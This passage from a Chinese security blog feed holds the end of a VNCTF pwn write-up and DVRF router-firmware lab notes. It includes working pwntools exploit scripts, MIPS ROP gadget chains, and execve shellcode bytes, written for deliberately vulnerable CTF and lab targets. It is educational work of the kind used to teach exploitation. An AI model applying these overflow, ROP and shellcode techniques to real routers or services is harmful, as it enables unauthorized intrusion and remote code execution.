low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xb70</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x403</span>)       <span class="comment">#store &quot;flag&quot; low 8bit(rsi)</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)       <span class="comment">#load stack_addr(ebp) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x404</span>)       <span class="comment">#store &quot;flag&quot; high 8bit(rsi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 7</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x20429)      #0x130569-0x110140</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x1de79</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x405</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x406</span>)       <span class="comment">#read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 8 </span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)      <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x407</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x408</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">1</span>)            <span class="comment">#push 1 high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x409</span>)</span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 1 low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40a</span>)       </span><br><span class="line"></span><br><span class="line"><span class="comment"># step 9</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40b</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40c</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x30</span>)         <span class="comment">#push 0x30 low 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40d</span>)</span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0x30 high 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40e</span>) </span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xb70</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40f</span>)       <span class="comment">#store &quot;flag&quot; low 8bit(rsi)</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x410</span>)       <span class="comment">#store &quot;flag&quot; high 8bit(rsi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 10</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x20359)      #0x130569-0x110210</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x1de19</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x411</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x412</span>)       <span class="comment">#write</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./hh&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25189</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me you choice :\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x400B46&quot;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me you choice :\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h2><h2 id="官方-WP"><a href="#官方-WP" class="headerlink" title="官方 WP"></a>官方 WP</h2><p><a href="https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA">https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVRF路由器漏洞靶机题目笔记</title>
      <link href="archives/6f13cd09/"/>
      <url>archives/6f13cd09/</url>
      
        <content type="html"><![CDATA[<h2 id="DVRF-项目介绍"><a href="#DVRF-项目介绍" class="headerlink" title="DVRF 项目介绍"></a>DVRF 项目介绍</h2><p>该项目目标是模拟一个真实的环境，帮助人们了解 x86_64 之外的其他 CPU 架构。此固件是针对 Linksys E1550 设备量身定制的。如果您没有，请不要担心！可以用 qemu 模拟。</p><p>项目地址：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h2 id="模拟环境"><a href="#模拟环境" class="headerlink" title="模拟环境"></a>模拟环境</h2><p>主要是用 ubuntu 16 ，如果部分题目用 qemu-user 模拟不了，就转去 attify 3.0 。但是 attify gdb 插件 gef 视乎在模拟时 vmmap 查不过来 libc 地址，问题不大只是查询方法饶了一点，还是可以解决的。</p><ul><li>ubuntu 16.04<ul><li>pwndbg</li><li>Qemu-static(version 2.11.1)</li><li>gdb-multiarch</li></ul></li><li>attify 3.0<ul><li>下载地址：<a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></li></ul></li></ul><h2 id="stack-bof-01"><a href="#stack-bof-01" class="headerlink" title="stack_bof_01"></a>stack_bof_01</h2><p>获取参数后，未校验长度赋值给局部变量造成栈溢出，有后门函数 <code>0x00400950</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234221.png" alt="image-20210311234221215"></p><p>Main 函数由 libc_main_start 调用，即 main 函数为<strong>非叶子函数</strong>，返回地址存放在栈上，从汇编可见：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234457.png" alt="image-20210311234457308"><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234516.png" alt="image-20210311234516201"></p><p>直接跳转 0x00400950 会因为 t9 的值被修改而错误。<strong>mips默认 t9 为当前函数开始地址。函数内部通过 t9 寄存器和 gp 寄存器来找数据，地址等。</strong></p><p>其他师傅文章中是通过找 libc 中的 <code>lw $t9, arg_0($sp);jalr $t9</code> 调整 t9 寄存器。但是我固件镜像中的 libc 没有这个 gadget ，按照偏移地址跳转过去是 <code>jalr $t9</code> 。换个思路直接跳过 dat_shell 开头调整 gp 部分：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312111808.png" alt="image-20210312111802336"></p><p>修复 t9 寄存器思路参考师傅文章：<a href="https://www.cnblogs.com/hac425/p/9416758.html">https://www.cnblogs.com/hac425/p/9416758.html</a></p><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>需要打开几个 terminal 启动不同的命令：</p><ul><li><p>启动 qemu 模拟</p><blockquote><p>-strace 查看 qemu 调试信息，方便观察执行了什么命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel-static -L . -g 1234 -strace ./pwnable/Intro/uaf_01 aaaa</span><br></pre></td></tr></table></figure></li><li><p>gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> architecture mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure></li></ul><p>连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就慢慢单步调试。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>字符串是从参数读入，跳转地址转换后是不可见字符 ，需要借助 <code>cat</code> 传入参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file_name: stack_bof_01.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwnable/Intro/stack_bof_01&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0040095c</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc8</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stack_bof_01_payload&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(payload)</span><br></pre></td></tr></table></figure><p>命令行执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 <span class="string">&quot;`cat stack_bof_01_payload`&quot;</span></span><br></pre></td></tr></table></figure><h2 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h2><p>和前面一题差不多，调试方法也一样，就是少了后门函数，造成溢出函数变成了 <code>strcpy</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312174644.png" alt="image-20210312174639280"></p><p>main 非叶子函数覆盖函数返回地址跳转存放在栈上的 shellocde 。qemu 模拟地址没有随机化，相当于 aslr 关闭了，直接调试查出 v4 的内存地址</p><blockquote><p>Shellcode 查询：<a href="http://shell-storm.org/shellcode/files/shellcode-792.php">http://shell-storm.org/shellcode/files/shellcode-792.php</a></p></blockquote><p>直接写入 shellcode 可以完整执行完，但是执行 <code>syscall 0x40404</code> 之后没有弹 shell 而是进行运行到下一条指令。问了师傅说也有遇到过这种情况，通过加无意义的指令(nop)调整 shellcode 位置有机会能成，用了 <code>XOR $t1, $t1, $t1</code> 避免 strcpy <code>\x00</code> 截断（只有不包含截断符指令都行），尝试后无果。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312182503.png" alt="image-20210312182502998"></p><p>查阅资料后发现，由于 mips 是流水指令集，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode 。</p><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/#2-dvrf-stack_bof_02c">https://ctf-wiki.org/pwn/linux/mips/mips_rop/#2-dvrf-stack_bof_02c</a></p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312200133.png" alt="image-20210312200133500"></p><p>构造 ROP 的 gadget 得去 libc 找，程序自身没多少个。我在 ubuntu18 gdb 连上报错，换到 ubuntu16 vmmap 查不出来 libc 信息（如图），最后换 attify 解决问题。</p><blockquote><p>libc路径：/squashfs-root/lib/libc.so.0</p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210313011756.png" alt="image-20210313011756132"></p><p>先调用 sleep(1) 就需要找 gadget 控制参数以及跳转。<code>mipsrop.find(&quot;li $a0,1&quot;)</code> 控制第一个参数，任选一个后面 rop 没有 gadget 继续构造就换一个 -。-  ，我选着第二个构造 <code>gadget1 = 0x2FB10</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210313002948.png" alt="image-20210313002948429"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0002FB10                 li      $a0, 1</span><br><span class="line">.text:0002FB14                 move    $t9, $s1</span><br><span class="line">.text:0002FB18                 jalr    $t9 ; sub_2F818</span><br></pre></td></tr></table></figure><p>接着需要找一个控制 s1 的 gadget ，用于控制执行完 gadget1 之后跳转到哪里。<code>mipsrop.find(&quot;li $s1&quot;)</code> 结果有很多，最后选了 <code>gadget2 = 0x00007730</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00007730                 lw      $ra, 0x18+var_s10($sp)</span><br><span class="line">.text:00007734                 lw      $s3, 0x18+var_sC($sp)</span><br><span class="line">.text:00007738                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:0000773C                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00007740                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:00007744                 jr      $ra</span><br></pre></td></tr></table></figure><p>至此 <strong>a0 被控制为 1</strong> ，目前 payload 结构为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p>不能直接将 sleep(0x767142b0) 填到 s1 处，因为直接填地址跳转 sleep 缺少了跳转前将返回地址放到 ra 寄存器（或压栈）的过程，当 sleep 运行到结尾的 <code>jalr $ra</code> 时，又会跳转会到 gadget1 ，所以要换个方式。</p><p><code>mipsrop.tails()</code> 找通过 s0\s2\s3 寄存器跳转的 gadget ，选择了 <code>gadget3 = 0x00020F1C</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00020F1C                 move    $t9, $s2</span><br><span class="line">.text:00020F20                 lw      $ra, 0x18+var_sC($sp)</span><br><span class="line">.text:00020F24                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:00020F28                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00020F2C                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:00020F30                 jr      $t9</span><br></pre></td></tr></table></figure><p>解决 sleep 运行结束返回地址问题，并 <code>lw $ra, 0x18+var_sC($sp)</code> 控制下一层跳转，payload 结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p><code>mipsrop.stackfinders()</code> 找一个 gadget 提取栈地址放到寄存器中，找的时候还要注意控制下一次跳转选择 <code>gadget4 = 0x16dd0</code>  这个，通过 gadget3 提前将下次跳转地址写入 s0 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00016DD0                 addiu   $a0, $sp, 0x38+var_20</span><br><span class="line">.text:00016DD4                 move    $t9, $s0</span><br><span class="line">.text:00016DD8                 jalr    $t9</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p>最后找一个用 a0 跳转的 gadget ，一开始用 <code>mipsrop.tails()</code> 没找到，最后用 <code>mipsrop.find(&quot;move $t9,$a0)&quot;)</code> 找着了 <code>gadget5 = 0x214a0</code> ，对 mipsrop 理解不够……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000214A0                 move    $t9, $a0</span><br><span class="line">.text:000214A4                 sw      $v0, 0x30+var_18($sp)</span><br><span class="line">.text:000214A8                 jalr    $t9</span><br></pre></td></tr></table></figure><p>最后跳转 shellcode 时，<code>0x000214A4</code> 的这句汇编 <code>sw $v0, 0x30+var_18($sp)</code> 会将 shellcode 第一个指令替换为 nop ，用无意义指令填充，将 shellcode 向后移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = 0x766e5000</span></span><br><span class="line">sleep = <span class="number">0x767142b0</span><span class="comment">#0x2F2B0+0x766e5000</span></span><br><span class="line">gadget1 = <span class="number">0x76714b10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76714b10:lia0,1</span></span><br><span class="line"><span class="string">   0x76714b14:movet9,s1</span></span><br><span class="line"><span class="string">   0x76714b18:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2 = <span class="number">0x766ec730</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766ec730:lwra,40(sp)</span></span><br><span class="line"><span class="string">   0x766ec734:lws3,36(sp)</span></span><br><span class="line"><span class="string">   0x766ec738:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x766ec73c:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x766ec740:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x766ec744:jrra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget3 = <span class="number">0x76705f1c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76705f1c:movet9,s2</span></span><br><span class="line"><span class="string">   0x76705f20:lwra,36(sp)</span></span><br><span class="line"><span class="string">   0x76705f24:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x76705f28:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x76705f2c:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x76705f30:jrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget4 = <span class="number">0x766fbdd0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766fbdd0:addiua0,sp,24</span></span><br><span class="line"><span class="string">   0x766fbdd4 &lt;optarg&gt;:movet9,s0</span></span><br><span class="line"><span class="string">   0x766fbdd8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget5 = <span class="number">0x767064a0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x767064a0:movet9,a0</span></span><br><span class="line"><span class="string">   0x767064a4:swv0,24(sp)</span></span><br><span class="line"><span class="string">   0x767064a8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962</span></span><br><span class="line">shellcode += <span class="string">&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 0x6873</span></span><br><span class="line">shellcode += <span class="string">&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span 